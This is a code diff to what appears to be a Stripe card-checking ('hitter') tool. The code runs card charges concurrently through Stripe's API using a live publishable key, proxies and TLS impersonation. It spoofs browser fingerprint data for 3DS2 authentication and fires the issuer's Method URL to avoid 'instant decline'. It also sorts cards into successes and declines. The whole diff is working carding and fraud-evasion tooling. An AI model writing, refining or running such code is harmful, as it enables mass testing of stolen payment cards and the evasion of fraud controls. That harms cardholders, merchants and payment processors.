@@ -719,9 +719,15 @@ class StripeAPIHitter:
                                 server_trans_id = sdk.get('server_transaction_id')
                                 
                                 if source_id:
-                                    # Spoof legitimate browser environment for 3DS evaluation
-                                    # Updated to match bleeding-edge Stripe.js modern fingerprint payload
-                                    browser_info = {
+                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+                                    auth_headers = {
+                                        "accept": "application/json",
+                                        "content-type": "application/x-www-form-urlencoded",
+                                        "origin": "https://js.stripe.com",
+                                        "referer": "https://js.stripe.com/",
+                                        "user-agent": "Mozilla/5.0 (Linux; Android 10)"
+                                    }
+                                    browser = {
                                         "fingerprintAttempted": True,
                                         "fingerprintData": None,
                                         "challengeWindowSize": None,
@@ -729,43 +735,15 @@ class StripeAPIHitter:
                                         "browserJavaEnabled": False,
                                         "browserJavascriptEnabled": True,
                                         "browserLanguage": "en-US",
-                                        "browserColorDepth": str(profile["color_depth"]),
-                                        "browserScreenHeight": str(profile["screen_height"]),
-                                        "browserScreenWidth": str(profile["screen_width"]),
-                                        "browserTZ": "-240",
-                                        "browserUserAgent": profile["user_agent"]
+                                        "browserColorDepth": "24",
+                                        "browserScreenHeight": "873",
+                                        "browserScreenWidth": "393",
+                                        "browserTZ": "-300",
+                                        "browserUserAgent": auth_headers["user-agent"]
                                     }
-                                    
-                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
-                                    
-                                    # EMVCo 3DS Method URL Execution (Critical for modern ACS frictionless approval)
-                                    method_url = next_action['use_stripe_sdk'].get('three_ds_method_url')
-                                    if method_url and server_trans_id:
-                                        try:
-                                            import base64
-                                            method_data = json.dumps({
-                                                "threeDSServerTransID": server_trans_id,
-                                                "threeDSMethodNotificationURL": "https://stripe.com/3ds2/method_notification"
-                                            })
-                                            b64_method_data = base64.urlsafe_b64encode(method_data.encode()).decode().rstrip("=")
-                                            
-                                            method_headers = headers.copy()
-                                            method_headers["content-type"] = "application/x-www-form-urlencoded"
-                                            # Fire-and-forget the Method URL POST so it doesn't block our execution time.
-                                            # We just need the ACS to see our IP, we don't care about the response.
-                                            asyncio.create_task(
-                                                loop.run_in_executor(None, lambda: cffi_requests.post(method_url, headers=method_headers, data={"threeDSMethodData": b64_method_data}, proxies=proxies, timeout=2, impersonate=profile["impersonate"]))
-                                            )
-                                            
-                                            # EMVCo Timing Protocol: Wait for the ACS to process the fingerprint asynchronously
-                                            # 1.2s is the optimal sweet spot between speed and ACS processing time.
-                                            await asyncio.sleep(1.2)
-                                        except Exception as e:
-                                            pass
-                                            
                                     auth_data = {
                                         "source": source_id,
-                                        "browser": json.dumps(browser_info, separators=(',', ':')),
+                                        "browser": json.dumps(browser),
                                         "one_click_authn_device_support[hosted]": "false",
                                         "one_click_authn_device_support[same_origin_frame]": "false",
                                         "one_click_authn_device_support[spc_eligible]": "false",
@@ -774,62 +752,58 @@ class StripeAPIHitter:
                                         "key": self.pk_live
                                     }
                                     
-                                    auth_headers = headers.copy()
-                                    auth_headers["origin"] = "https://js.stripe.com"
-                                    auth_headers["referer"] = "https://js.stripe.com/"
+                                    # EMVCo Method URL execution to prevent instant decline
+                                    method_url = sdk.get('three_ds_method_url')
+                                    if method_url and server_trans_id:
+                                        try:
+                                            import base64
+                                            b64_method_data = base64.urlsafe_b64encode(json.dumps({"threeDSServerTransID": server_trans_id, "threeDSMethodNotificationURL": "https://stripe.com/3ds2/method_notification"}).encode()).decode().rstrip("=")
+                                            m_headers = headers.copy()
+                                            m_headers["content-type"] = "application/x-www-form-urlencoded"
+                                            asyncio.create_task(loop.run_in_executor(None, lambda: cffi_requests.post(method_url, headers=m_headers, data={"threeDSMethodData": b64_method_data}, proxies=proxies, timeout=2, impersonate=profile["impersonate"])))
+                                            await asyncio.sleep(1.2)
+                                        except: pass
+
+                                    auth_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                                     
-                                    auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
-                                    auth_json = auth_res.json()
+                                    try:
+                                        data = auth_resp.json()
+                                        state = data.get("state")
+                                    except Exception:
+                                        state = "3DS Attempt failed"
+                                        
+                                    if state == "challenge_required":
+                                        result['decline_code'] = '3d_secure_required_hard'
+                                        return result
+
+                                    intent_id = pi.get('id') if isinstance(pi, dict) and pi.get('id') else (si.get('id') if isinstance(si, dict) else None)
+                                    client_secret = pi.get('client_secret') if isinstance(pi, dict) and pi.get('client_secret') else (si.get('client_secret') if isinstance(si, dict) else None)
                                     
-                                    state = auth_json.get('state')
-                                    if state == 'frictionless':
-                                        # Frictionless successful, confirm the charge again
-                                        confirm_data_2 = {
-                                            "payment_method": confirm_json.get('payment_method') or (pi.get('payment_method') if isinstance(pi, dict) else None),
-                                            "key": self.pk_live,
-                                            "expected_payment_method_type": "card",
+                                    if intent_id and client_secret:
+                                        if 'seti' in intent_id:
+                                            poll_url = f"https://api.stripe.com/v1/setup_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
+                                        else:
+                                            poll_url = f"https://api.stripe.com/v1/payment_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
+                                            
+                                        poll_headers = {
+                                            "accept": "application/json",
+                                            "origin": "https://js.stripe.com",
+                                            "referer": "https://js.stripe.com/"
                                         }
-                                        if self.raw_amount is not None and self.raw_amount > 0:
-                                            confirm_data_2["expected_amount"] = self.raw_amount
-                                        confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
-                                        confirm_json_2 = confirm_res_2.json()
+                                        poll_resp = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url, headers=poll_headers, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                        poll_json = poll_resp.json()
                                         
-                                        status_2 = confirm_json_2.get('status')
-                                        pi_2 = confirm_json_2.get('payment_intent', {})
-                                        if isinstance(pi_2, dict) and pi_2.get('status'): status_2 = pi_2.get('status')
-                                        
+                                        status_2 = poll_json.get('status')
                                         if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                             result['success'] = True
                                         else:
-                                            err = confirm_json_2.get('error', {})
-                                            if isinstance(pi_2, dict) and pi_2.get('last_payment_error'): err = pi_2.get('last_payment_error')
+                                            err = poll_json.get('last_payment_error', poll_json.get('last_setup_error', poll_json.get('error', {})))
                                             result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                             result['error'] = err.get('message', 'Unknown error')
                                         return result
-                                        
-                                    elif state == 'challenge_required':
-                                        # Use the exact return structure from the friend's snippet
-                                        taken = time.time() - start
-                                        return {
-                                            "status": False,
-                                            "result": {
-                                                "status": "declined",
-                                                "message": state,
-                                                "time": taken
-                                            }
-                                        }
                                     else:
-                                        err = auth_json.get('error', {})
-                                        if err.get('type') == 'invalid_request_error' and not err.get('message'):
-                                            result['decline_code'] = '3d_secure_auth_failed'
-                                            return result
-                                            
-                                        if '3D Secure 2 is not supported' in err.get('message', ''):
-                                            result['decline_code'] = '3d_secure_2_not_supported'
-                                            return result
-                                        
                                         result['decline_code'] = '3d_secure_auth_failed'
-                                        result['error'] = str(auth_json)[:500]
+                                        result['error'] = str(data)[:500] if 'data' in locals() else 'Missing intent context'
                                         return result
                                         
                             elif next_action.get('type') == 'redirect_to_url':
@@ -990,16 +964,8 @@ class ConcurrentHitter:
                             continue
                     break
                 
-                # Normalize the output structure if it came from the friend's exact challenge_required snippet
-                if not result.get('success', False) and 'result' in result and isinstance(result['result'], dict):
-                    inner = result['result']
-                    result['decline_code'] = inner.get('message', '3d_secure_required_hard')
-                    result['error'] = 'Challenge Required (Hard 3DS)'
-                    result['response_time'] = inner.get('time', 0)
-                    result['success'] = inner.get('status') == 'approved'
-
                 self.completed += 1
-                if result.get('success', False):
+                if result['success']:
                     self.successes += 1
                 else:
                     self.fails += 1
